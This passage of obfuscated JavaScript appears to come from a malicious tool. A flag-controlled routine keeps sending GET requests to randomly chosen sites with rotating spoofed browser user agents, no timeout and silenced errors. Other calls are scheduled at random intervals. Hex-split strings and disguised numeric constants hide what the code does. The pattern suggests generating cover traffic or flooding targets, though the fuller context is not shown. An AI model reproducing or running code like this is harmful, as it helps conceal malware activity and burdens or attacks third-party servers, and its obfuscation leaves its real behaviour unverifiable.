      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0xea3 + -0x1 * -0xa7 + 0xce * -0x13; k < -0x68b * 0x4 + 0x844 + -0x8f6 * -0x2; k++)
    setTimeout(f, (0x4a * 0x5a7 + -0xb6 * -0x81 + 0x472 * -0x3e) * k * getRandomInt(0x1 * -0xa9b + 0x242 + 0x85a, 0x1e65 + -0x14 * 0xe5 + -0xc7e));
  setInterval(() => {
    f();
    for (let l = -0x1673 + 0x1d93 + -0x260 * 0x3; l < -0x15b2 + 0x1e71 + -0xf * 0x95; l++)
      setTimeout(f, (-0x1 * -0x1510a + -0x128f7 + 0xc24d) * l * getRandomInt(0x24df + 0x239f + -0x487d, -0xaa5 * -0x2 + 0x3 * -0x52 + 0x1 * -0x1451));
  }, -0xa27db * -0x7 + -0x2b7df9 + -0x6d55f * -0x4);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x2 * -0x4bd + -0x15b0 * -0x1 + 0x1a * 0x95) * getRandomInt(0x2d * 0x55 + -0xd3 * 0xf + -0x293, -0x2284 + -0x137e + -0x1 * -0x3607));
}, 0x84e + 0x29a + -0x2 * 0x542);